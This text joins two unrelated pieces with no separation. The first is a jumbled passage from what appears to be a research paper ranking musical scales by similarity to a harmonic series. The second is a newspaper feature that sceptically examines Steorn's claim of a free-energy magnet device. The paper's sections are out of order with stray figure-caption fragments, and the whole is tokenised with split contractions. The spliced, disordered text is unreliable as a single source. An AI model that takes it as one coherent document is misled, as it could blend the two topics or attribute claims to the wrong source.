For example , using the value of 240 discriminable tones over an octave given by Zwicker and Fastl [ 1 ] , the number of possible seven - note combinations is > 10 11 .
As a compromise between evaluating as many scales as possible while limiting the computational load , we restricted the potential scale tones to 60 tones ( i.e. , 25 % of the number of discriminable tones in an octave ; see Table 1 ) .
The 60 tones used were those that , as dyadic combinations with a fixed tonic , had the greatest percentage similarity to a harmonic series .
The tones in this subset were separated by 20 cents on average , which is much closer than the ∼ 100 cent minimum separation of tones in most scales ; even classical Indian microtones ( srutis ) are never separated by less than 22 cents [ 3 ] .
This restriction left for analysis 455,126 possible pentatonic scales , 45,057,474 heptatonic scales and 279,871,768,995 dodecatonic ( 12 - note ) scales ( again for reasons of computational efficiency , we analyzed a random sample of only 10 million possible dodecatonic scales ) .
The numbers of possible scales we analyzed are given by n = 59 and k = 4 , 6 , and 11 ; 59 was used rather than 60 because the octave is assumed as a component interval of all scales , and 4 , 6 and 11 were used rather than 5 , 7 , and 12 because we treated the first note as a fixed reference point ( i.e. a tonic ) .
Thus the tonic note and the octave above it bounded all the scales analyzed .
A MATLAB ( The Mathworks Inc. , Natick MA ) algorithm was written to compute the mean percentage similarity for each potential scale and to rank the scales in descending order according to their mean percentage similarity .
Because musical scale tones are not always defined by a single frequency ratio ( e.g. , the ratios of 7∶5 or 10∶7 can both represent a tritone ) , the algorithm we used allowed tones within a specific frequency distance to represent the same scale tone .
To our knowledge , there is no psychoacoustical data on the size of the frequency window within which intervals are considered musically equivalent .
We thus defined the window based on musical practice .
Twenty - two cents was used because it is the maximum frequency distance between scale tones that are considered musically equivalent in Western music ( i.e. , the interval between the minor sevenths defined by ratios of 9∶5 and 16∶9 [ 7 ] ) ; it is also the minimum frequency distance between two tones that are considered unique in classical Indian music [ 3 ] .
Note that 22 cents is significantly larger than the just noticeable frequency difference between tones ( around five cents ) , implying that the size of the window is not based on the resolution of the auditory system .
If two or more ratios fell within the 22 cent window , the algorithm defaulted to the ratio yielding the highest percentage similarity from any comparison .
For example , if 9∶8 or 10∶9 represented the second scale degree of a scale being tested ( these two intervals are within 22 cents of each other ) , the algorithm would use 9∶8 rather than 10∶9 to form an interval with a perfect fifth ( 3∶2 ) because this choice produces the interval ( 4∶3 versus 27∶20 ) with the higher percentage similarity .
Conversely , the algorithm would use 10∶9 rather than 9∶8 to form an interval with a major sixth ( 5∶3 ) because this choice produces the interval ( 3∶2 versus 40 ∶ 27 ) with the higher percentage similarity .
Each scale analyzed is bounded by two tonics that are separated by an octave ( see Figure 1 ) ; thus intervals spanning octaves ( e.g. , in a natural minor scale , the interval of a major third between the seventh scale degree and the second scale degree in the octave above ) are not included in the calculation of the mean percentage similarity .
In Western music , intervals spanning octaves are used in melody ; however , in particular scales used by other cultures ( classical Indian music for example ) , these intervals are not used [ 22 ] – [ 24 ] .
Given these facts , we do not assume intervals across octaves to be part of any formal scale structure .
A ) The 15 possible intervals between the tones of this scale .
B )
The percentage similarity of each scalar interval compared to a harmonic series ( see Figure 2 ) and the mean percentage similarity of the full scale are indicated .
Scale degrees are conventionally indicated as frequency ratios with respect to a fixed tonic .
The overall conformance of a scale to a harmonic series was then determined by calculating the mean percentage similarity of the dyads in the scale in question ( Figure 3 ) .
Using the mean as an index of similarity between a scale and a harmonic series implies that all possible dyads in the scale are equally relevant .
Although in contemporary Western music any two notes in a scale can , in principle , be used together in melody or harmony , in traditional Western voice - leading and in other musical systems ( e.g. , classical Indian ) particular tone combinations are avoided or prohibited [ 22 ] – [ 24 ] , [ 25 ] , [ 26 ] .
Nonetheless , there is no universal rule that describes which intervals might be more important in a scale than others ; thus we treated all intervals equally .
The degree of similarity between a two - tone combination ( a dyad or interval ) and a harmonic series was expressed as the percentage of harmonic frequencies that the dyad held in common with a harmonic series defined by the greatest common divisor of the harmonic frequencies in the dyad ( Figure 2 ) .
Perceptually , the greatest common divisor of the dyad corresponds to its virtual pitch ( or missing fundamental ) and is used in much the same way as in algorithms that determine virtual pitch [ 11 ] , [ 21 ] .
Since the robustness of a virtual pitch depends on how many of the lower harmonics are present in the stimulus [ 1 ] , [ 21 ] , this measure of similarity is both physically and perceptually relevant .
For example , a dyad whose spectrum comprises 50 % of the harmonic frequencies in a harmonic series would evoke a stronger virtual pitch perception than a dyad with only 10 % of these frequencies .
We refer to this metric as the percentage similarity of a dyad .
Percentage similarity can be expressed as ( ( x+y − 1 ) / ( x*y ) ) * 100 , where x is the numerator of the frequency ratio and y is the denominator of the ratio .
For instance , a major third has a frequency ratio of 5 ∶ 4 ; since x = 5 and y = 4 , the percentage similarity is 40 % .
When we compared the chromatic scale to a random sample of 10 million other possible 12 - note scales , we found that ∼ 1.5 million had higher mean percentage similarity to a harmonic series , and none of these , to our knowledge , have been used in music .
These results are in sharp contrast to the commonly used five - and seven - note scales that rank at or near the top of their respective groupings .
This observation suggests that the chromatic scale has no basis in similarity to a harmonic series .
This result is consistent with the fact that the full set of 12 tones is not as widely used as the five - and seven - tone subsets shown in Figure 1 , and is considered by some to be less accessible to listeners [ 14 ] , [ 30 ] .
Nonetheless , modern composers such as Schoenberg , Webern and Berg have used the chromatic scale as a basis for musical compositions .
The 50 heptatonic scales with the highest mean percentage similarity among the > 4×10 7 possible scales evaluated are shown in Table 3 .
Three of the seven heptatonic modes ( see Figure 1 ) emerge at the top of this list .
The Phrygian mode holds the highest rank followed by the Dorian mode and the Ionian mode ( the major scale ) .
The fourth ranked scale is similar to the Phrygian mode but contains a neutral second ( 12∶11 ) instead of a minor second ; this collection is the Husayni scale in Arabic music [ 27 ] .
The Aeolian mode ( the natural minor scale ) and Lydian mode are the fifth and sixth ranked scales .
The next three scales are similar to the Dorian mode but with slight alterations in one or two scale degrees .
The seventh ranked scale may represent the Kafi scale in classical Indian music with an alternative sharp sixth scale degree [ 22 ] .
The eighth ranked scale is the Kardaniya scale in Arabic music [ op cit . ] .
Although the ninth ranked scale does not represent any well - known musical tone collection , the Mixolydian mode is ranked tenth .
The Locrian , which is the least used of the Western modes , is ranked fiftieth .
Thus both the five - note and seven - note scales preferred in much music worldwide comprise intervals that conform optimally to a harmonic series .
Table 2 lists the 50 five - note scales among the > 4×10 5 possibilities evaluated in this category with the highest mean percentage similarity to a harmonic series .
The scale topping the list is the minor pentatonic scale , one of the most widely used five - note scales [ 5 ] .
The second highest ranked is the Ritusen scale , a pentatonic mode used in traditional Chinese and Indian music ( see Figure 1 ; [ 3 ] , [ 9 ] , [ 10 ] , [ 22 ] – [ 24 ] ) .
The third and fourth ranked pentatonic scales are the ascending forms of two ragas ( Candrika todi and Asa - gaudi ) used in classical Indian music [ 3 ] .
Although these two scales are not formally recognized in Western music theory , they can be thought of as the natural minor and major heptatonic scales , respectively , with the second and seventh scale degrees excluded .
Thus some Western melodies are likely to use these particular combinations of tones .
The fifth ranked pentatonic scale is identical to the Ritusen scale ( known as the Durga raga in classical Indian music ) except that the fifth scale degree ( 17∶10 in this case ) is ∼ 34 cents sharp ( i.e. , higher in frequency ) compared to the 5∶3 major sixth in the Ritusen scale .
Because a sharp sixth interval is musically acceptable in certain contexts in classical Indian music , this scale may indeed represent the Durga raga ( see Discussion ) .
The sixth through eighth ranked five - note scales are the remaining modes of the major / minor pentatonic scale ( see Figure 1 ) , and the ninth ranked scale is the Catam raga [ 3 ] .
Discussion
The results we report indicate that musical scale preferences are predicted by the overall similarity of their component intervals to a harmonic series .
However , several caveats and the possible reasons behind this preference deserve mention .
Competing explanations of interval preference
Although the results shown in Tables 2 and 3 suggest that musical intervals that are maximally similar to a harmonic series are favored , a number of other explanations of interval preferences have been proposed over the years .
One historically important theory was suggested by Helmholtz [ 19 ] , who argued that dissonant musical tone combinations are produced by inadequate harmonic overlap .
In other words , when the harmonics of two musical tones fall within the minimum frequency distance at which two pure tones can be individually resolved by humans ( the critical bandwidth ) , an unpleasant perception of “ beating and roughness ” occurs ( see also refs . 11 , 39 – 42 ) .
Another explanation for interval preferences is based on the relationships among the harmonics produced by the voice or by musical instruments [ 20 ] , [ 21 ] .
In this view , the frequency ratios between lower , more powerful harmonics are more readily appreciated , leading to a perceptual preference for dyads whose fundamentals are smaller integer ratios .
A third interpretation of scale preferences is based on the elicitation of more harmonious virtual pitches [ 45 ] .
For example , in addition to the perception of the pitches of the two component tones , a perfect fifth elicits the perception of a virtual pitch an octave below the lower tone .
In this theory , such virtual pitches could make an interval more consonant .
Whether any of these theories of dyadic preference could account for scale preferences in music has not been examined .
Nonetheless , the rankings of interval preferences predicted by these theories are similar to one another and to the ranking predicted by harmonic series - similarity ( see Table 1 ) [ 19 ] – [ 21 ] , [ 39 ] – [ 42 ] , [ 45 ] .
This is not surprising since each theory was developed to explain the same generally accepted consonance ranking of dyads .
Thus any of these theories could account for scale preferences if the metrics were quantified and used in the algorithm presented here in place of percentage similarity .
For example , the scales with the highest mean percentage similarity are likely to be the ones with the highest mean harmonic overlap or lowest mean beating .
It is impossible to tease apart the metric or combination of metrics that is responsible for scale preferences using this algorithm alone .
It is noteworthy , however , that these theories are all variations of the same general idea , namely a human preference for particular characteristics of harmonic series .
A biological rationale
Why then should this preference exist ?
Although other explanations cannot be ruled out based on the data we have presented , for the reasons discussed in this section , we favor a biologically based preference for harmonic series as the most plausible explanation for the particular scales used to make music over history and across cultures .
Like any other sensory quality , the human ability to perceive tonal ( i.e. , periodically repeating ) sound stimuli has presumably evolved because of its biological utility .
In nature , such sound stimuli typically occur as harmonic series produced by objects that resonate when acted on by a force [ 19 ] , [ 31 ] .
Such resonances occur when , for example , wind or water forces air through a blowhole or some other accidental configuration , but are most commonly produced by animal species that have evolved to produce periodic sounds for social communication and ultimately reproductive success ( e.g. , the sounds of stridulating insects , the vibrations produced by the songbird syrinx , and the vocalizations of many mammals ) .
Although all these harmonic stimuli are present in the human auditory environment , the vocalizations of other humans are presumably the most biologically relevant and frequently experienced .
In humans , vocal stimuli arise in a variety of complex ways , not all of which are harmonic .
Harmonic series depend on vocal fold vibrations and are characteristic of the “ voiced speech ” responsible for vowel sounds and some consonants [ 1 ] .
Although the relative amplitudes of harmonics are altered by filtering effects of the supralaryngeal vocal tract resonances to produce different vowel phones , the frequencies of harmonics remain unchanged [ op cit . ] .
In consequence , the presence of a harmonic series is a salient feature of human vocalizations and essential to human speech and language .
It follows that the similarity of musical intervals to harmonic series provides a plausible biological basis for the worldwide human preference for a relatively small number of musical scales defined by their overall similarity to a harmonic series .
Several lines of evidence accord with this idea .
First , humans and other primate species are specifically attracted to conspecific vocalizations , including those with harmonic and even specifically musical characteristics [ 32 ] – [ 38 ] .
Second , the human pinna , ear canal and basilar membrane are all optimized to transmit human vocalizations , suggesting that the human sense of tonality co-evolved to respond to the stimuli generated by the vocal tract [ 31 ] , [ 39 ] , [ 40 ] .
Third , a number of non-musical phenomena in tone perception including perception of the missing fundamental , pitch shift of the residue , spectral dominance and pitch strength can be explained by in terms of the specialization of the human auditory systems for processing vocal sounds [ 41 ] – [ 43 ] .
These observations all support the idea that the musical scales used over human history have resulted from a preference for collections of dyads that most resemble a harmonic series , and therefore human vocalizations .
The biological relevance of other musical features
This interpretation raises the question of whether other features of human vocalizations are , for similar reasons , influential in musical preferences .
In addition to harmonicity per se , particular frequency ranges , timbres and prosodic fluctuations make vocalizations specifically human and may be equally or more influential in musical preferences .
In support of this idea , non -human primates have been recently shown to respond affectively to music characterized by frequency ranges and prosody that are similar to their own vocalizations [ 44 ] .
This evidence accords with the fact that most music , even purely instrumental music , is composed within the human vocal range , and some popular instruments ( e.g. , the violin ) bear a timbral resemblance to the human voice [ 31 ] .
Moreover , many musical traditions use tones that fall between formal scale tones : in Western music , glissandos involve continuous changes in pitch , blues music depends on “ bending ” guitar strings to blend the pitches of major and minor thirds , and classical Indian music employs microtonal intervals that fall between the scale tones of ragas [ 24 ] .
These musical embellishments may reflect the continuous variations in fundamental frequencies that characterize speech prosody .
Preferred meters and tempos may also parallel speech and other vocalizations in ways that do not involve tonality at all [ 6 ] .
Thus while scale preferences seem to be based on the harmonic series that derive from vocal fold vibrations , other aspects of music may be favored because they resemble additional features of the human voice .
The different usage of highly ranked scales Although many of the highly ranked heptatonic and pentatonic scales in Tables 2 and 3 have been widely used in Western music , some others have not .
A possible explanation is that whereas all the modes shown in Figure 1 can be played using the same set of intervals , one or more additional intervals ( e.g. , a neutral second ) would be necessary to play the other highly ranked but little used variations .
Since it is relatively easy to play the modes on the same instrument with the same tuning , this property has both practical and theoretical appeal .
Nonetheless , some of these other scales are used in non-Western cultures [ 3 ] , [ 23 ] , perhaps because their instrumentation favors non-Western tonal relationships .
A few highly ranked scales in Tables 2 and 3 may not be used in music simply because they differ so little from the scales that are used .
For example , the ninth ranked heptatonic scale is not , to our knowledge , recognized as a scale in its own right .
It is , however , nearly the same as the Durga raga with microtonal embellishments , as well as to the Kafi scale and the Dorian mode , both of which have a higher mean percentage similarity .
A related concern is why the ordering of the widely used five - note and seven - note scales from greatest to least mean percentage similarity values in Tables 2 and 3 does not simply follow the order of their popularity , at least in Western music .
For example , the major and natural minor heptatonic scales prevalent in Western music today rank below the Phrygian and Dorian modes .
One possibility is again instrumentation .
For instance , an early explanation for using the Aeolian mode as opposed to another minor mode ( e.g. , Dorian ) was to facilitate performance on particular instruments in certain tunings [ 46 ] .
A scale that deserves special comment is the Locrian mode , which ranks much lower in Table 3 than the other modes .
The Locrian mode is recognized in Western music theory but rarely used .
While reasons cited for the infrequent use of the Locrian mode are its weak tonal center and dissonant tonic chord , it may be less desirable primarily because of the relatively low conformance of its intervals to a harmonic series and thus to the biological signature of voiced speech and other harmonic vocalizations .
Finally , although many of the widely used scales in music worldwide hold high ranks in Tables 2 and 3 , scales that are used in the music of a few cultures do not .
For example , the sléndro scale used in Javanese gamelan music comprises five approximately equally spaced tones over an octave [ 47 ] , [ 48 ] but is not among the pentatonic scales with the highest mean percentage similarity to a harmonic series .
A possible explanation in this case is that the metallophone instruments used by gamelan orchestras ( e.g. , bells and gongs that are idiosyncratic to a given geographical region ) generate non-harmonic frequencies .
Thus the present analysis based on harmonic series is not applicable to such instruments or the scales that derive from them .
It should also be noted that several Arabic scales examined are not present in Table 3 .
One possible explanation is that the most commonly used scales are those in Table 3 , while the less commonly used scales have lower percentage similarity .
However , to our knowledge , there is no consensus about which Arabic scales are most frequently used to make music .
Alternatively , harmonic series similarity may not the only factor influencing scale preferences in this culture .
By the same token , only a few of the hundreds to thousands of classical Indian ragas are represented among the highly ranked pentatonic and heptatonic scales .
However , nearly all the “ parent ” scales ( thats ) from which all ragas are derived are among the highly ranked heptatonic scales indicated by their Western names in Figure 1 and Table 3 .
The relative popularity of five - and seven - tone scales
The fact that most musical scales emphasize five or seven tones raises the question of why such scales are preferred over those with a larger or smaller numbers of tones .
As the number of tones in a scale decreases , the similarity of the tone collection to the character of a harmonic series increases ( compare the percentage similarity values of the top - ranked pentatonic and heptatonic scales in Tables 2 and 3 ) .
Conversely , dividing octaves into a larger number of intervals leads to tonal collections that meet this criterion less well .
Thus under the hypothesis that listeners prefer tone collections whose spectra are on average more like a harmonic series , the inclusion of intervals that conform to this criterion relatively poorly would provide an upper bound on the number of preferred scale tones .
Since tone collections with fewer notes have greater similarity to a harmonic series , it is less clear why tone collections smaller than five notes are not preferred .
One reason may be that as the number of scale tones that divide an octave decreases , the distance between successive notes necessarily increases .
Larger intervals are more difficult to sing [ 5 ] , presumably because the associated changes in vocal fold tension and vocal tract shape require a greater expenditure of neuromuscular energy and practice to develop the necessary coordination .
Multiple sequential skips ( intervals of a third or greater ) are discouraged in traditional rules of voice - leading for this reason [ 25 ] , [ 26 ] .
Thus beyond a relatively small number of scale tones ( e.g. , five ) , a further decrease would increase the difficulty of vocal ( or instrumental ) performance , outweighing the gain in harmonic series similarity .
Moreover , decreasing the number of scale tones decreases the variety of intervals available for musical composition .
In short , the number of tones used in popular scales may be a compromise between these competing factors .
A further issue is the place of six - note scales , which seem less frequently used than five - or seven - note scales .
In fact , blues scales , which are prevalent in popular music today , are often classified as six - note variants of five - or seven - note scales and considered hexatonic scales by some musicologists [ 49 ] – [ 51 ] .
Six tones are also used in particular Indian ragas [ 3 ] , [ 22 ] – [ 24 ] .
Melodies using heptatonic scales sometimes use only six out of the seven tones , and melodies using pentatonic scales often use passing tones not included in the scale structure as such [ 5 ] .
Such compositions could also be interpreted as using six - note scales .
Thus there is certainly nothing prohibitive about using a set of six tones to create music ; they are simply not recognized as formally as their five - and seven - note counterparts in Western music theory .
The method of analyzing scales
The algorithm we used to analyze scales is unique in that it accounts for every possible interval between scale tones over an octave .
Other analyses have focused on intervals between tones and the tonic [ 15 ] , [ 16 ] , [ 20 ] .
Accounting for all possible intervals is essential to our argument and essential to understanding the historical fact that intervals between any two scale tones can be heard as consonant or dissonant and affect the overall appeal of the scale [ 28 ] , [ 29 ] .
An algorithm of this sort has the further virtues of being able to incorporate other metrics of interval comparison ( see above ) and of demonstrating the spectral similarity of the scales commonly used in Western , Indian , Chinese and Arabic music ( see Tables 2 and 3 ) .
Heard the one about the two Irishmen who say they can produce limitless amounts of clean , free energy ?
Plenty of scientists have - but few are taking them seriously .
Steve Boggan investigates
Do you remember that awful feeling as a child on Christmas Day when Santa left you the toy you wanted . . . without any batteries ?
This feeling comes to me as I meet Sean McCarthy and Richard Walshe , two men making the claim that they are about to change the world - for ever .
These dynamic and personable businessmen from Dublin insist that they have found a way of producing free , clean and limitless energy out of thin air .
And they are so confident that they have thrown down the gauntlet to the scientific community in a bid to prove that they have rewritten the laws of physics .
Last week , frustrated that they could n't persuade scientists to take their work seriously , McCarthy , Walshe and the other 28 shareholders of Steorn , a privately owned technology research company , took out a full - page advertisement in the Economist .
In it , they called upon scientists to form a 12 - member jury to decide whether their free - energy system is real , hoaxed , imagined or incorrectly well - intentioned .
So , as they prepare to demonstrate this wonder of science to me at their modest offices near the Liffey , I feel all the excitement of Christmas Day .
There is a test rig with wheels and cogs and four magnets meticulously aligned so as to create the maximum tension between their fields and one other magnet fixed to a point opposite .
A motor rotates the wheel bearing the magnets and a computer takes 28,000 measurements a second .
The magnets , naturally , act upon one another .
And when it is all over , the computer tells us that almost three times the amount of energy has come out of the system as went in .
In fact , this piece of equipment is 285 % efficient .
That 's a lot of " free energy " and , supposedly , a slap in the face for one of physics ' most basic laws , the principle of conservation of energy : in an isolated system ( the planet , say ) , energy can be neither created nor destroyed ; it can only be converted from one form into another .
" We could n't believe it at first , either , " says McCarthy , chief executive of the company .
He is a 40 - year - old engineer born in Birmingham but brought up in Dublin .
After a couple of decades in the oil industry , McCarthy , Walshe and two others set up Steorn as a technology and intellectual - property development company .
" We did difficult things .
If someone had an idea that they wanted to make work , we 'd work on it with them , help them recruit staff and get them through to their first product . "
Then , by chance , came their " discovery " .
They were called upon by the police to help gain forensic evidence against " skimmers " who cloned the cards of people using ATMs .
Subsequently , when banks approached asking how they could prevent such fraud , Steorn advised that the best way was to catch the small number of people committing most of the crime .
They came up with a system of 16 tiny CCTV cameras that could guarantee recording the identities of the perpetrators .
" We wanted the cameras to be independently powered , so we tried out small solar and ambient wind generators , " says McCarthy .
" We wanted to improve the performance of the wind generators - they were only about 60 - 70 % efficient - so we experimented with certain generator configurations and then one day one of our guys [ co - founder Mike Daly ] came in and said : ' We have a problem .
We appear to be getting out more than we 're putting in . ' "
That was three years ago .
Since then , McCarthy says , the company has spent £ 2.7 m developing the technology .
Steorn has also gone into partnership with a European micro-generator company to develop prototypes .
In Steorn 's theory , fixed magnets could act upon a moving magnet in such a way as to make it a virtual perpetual motion generator .
In an electrical appliance - a computer , kettle , mobile phone or toy - that would provide all the power for its lifetime .
Of course , free - energy cars , power plants and water - pumping systems could follow .
A better world indeed .
But then that Christmas Day feeling kicks in ; doubts about the power source .
According to McCarthy and Walshe , the marketing manager , there have been no fewer than eight independent validations of their work conducted by electrical engineers and academics " with multiple PhDs " from world - class universities .
But none of them will talk to me , even off the record .
I am promised a diagram explaining how the system works , but then Steorn holds it back , saying its lawyers are concerned about intellectual property rights .
And that European partner , the one with the moving , almost perpetual , prototypes ?
It wo n't talk to me either and Steorn has undertaken not to name it .
" It 's the Pons - Fleischmann factor , " says McCarthy , and he and Walshe look at each other darkly .
Stanley Pons and Martin Fleischmann were the last experts to excite the scientific community with free - energy claims when , in 1989 , they reported producing a nuclear - fusion reaction at room temperature - what happens in the sun at millions of degrees centigrade .
The subsequent controversy resulted in the scientists being pilloried , even though the scientific community remains divided to this day over claims of " low - energy nuclear reactions " .
" No one in the scientific community wants to become embroiled in the kind of controversy that Pons and Fleishmann faced , " says McCarthy .
" With our challenge , we 're hoping to provide a respectable public platform for serious evaluation of the technology .
Then , perhaps , scientists will feel confident enough to challenge the conventional view . "
Certainly , the Steorn team seems genuine and well - intentioned .
Walshe says that if the technology is accepted it will be licensed to manufacturers , but given away to electrical and water projects in developing countries .
And , until their claims have been assessed by the jury , McCarthy says they wo n't be accepting any investor offers .
So if this is a hoax , it would appear not to be a money - making scheme ; Walshe says the Economist ad alone cost £ 75,000 .
" Before we went public , we realised that if we 're wrong it could have a very adverse effect on our business , so we 're not doing this lightly , " says McCarthy .
" We expected stick , and we 're getting it already .
We 've had a lot of abusive emails and telephone calls - people telling us to watch our backs , that sort of thing .
Someone even published my home address on a website . "
The conspiracy theorists are , indeed , having a field day in a forum section set up by the company on its website , www.steorn.com.
" We 've been accused of being a publicity stunt for the next Microsoft Xbox gaming system because some of the artwork on our website was similar to theirs , " says Walshe .
" Some people have said our offices do n't exist and one accused us of simply being a call centre in Australia because one of our telephonists has an Australian accent .
My favourite is the one that says we are a CIA or oil - industry front intended to discredit research into free and clean energy .
In other words , our claims are deliberately false and when they are found out to be , it will be a blow for all free and clean research . "
Steorn says it has seven patents pending on its technology , though it is difficult to see what can be patented ; magnets already exist and so do the 360 degrees of a circle .
Yet it is the positioning of the magnets that seems to be at the heart of this " new " energy .
And , as McCarthy points out , the Patent Office rejects inventions that fly in the face of such fundamental principles as , say , the conservation of energy .
Nevertheless , as of yesterday , almost 3,000 people claiming to be scientists had expressed an interest in sitting on the Steorn jury .
The 12 best will be chosen at the end of the month and then testing will begin .
" We 've been advised it could take between a week and 10 years , " says McCarthy .
" We do n't have any doubts .
We 've conducted meticulous research and we 're getting such phenomenal results - up to 400 % efficiency - that small glitches and errors in testing can be ruled out .
We really believe we 've found something that can change the world . "
The rest of us can only wait and see .
In the meantime , I ask Martin Fleischmann , the cold - fusion scientist , now 79 and retired , what he thought of the Steorn project .
" I am actually a conventional scientist , " he says , " but I do accept that the existing [ quantum electro - dynamic ] paradigm is not adequate .
If what these men are saying turns out to be true , that would be proof that the paradigm was inadequate and we would have to come up with some new theory .
But I do n't think their claims are credible .
No , I can not see how the position of magnetic fields allows one to create energy . "
With great charm , Dr Fleischmann wishes the Steorn team luck .
And if their " free " energy can light up a developing - world village or the eyes of a child with a toy , then perhaps we all should .
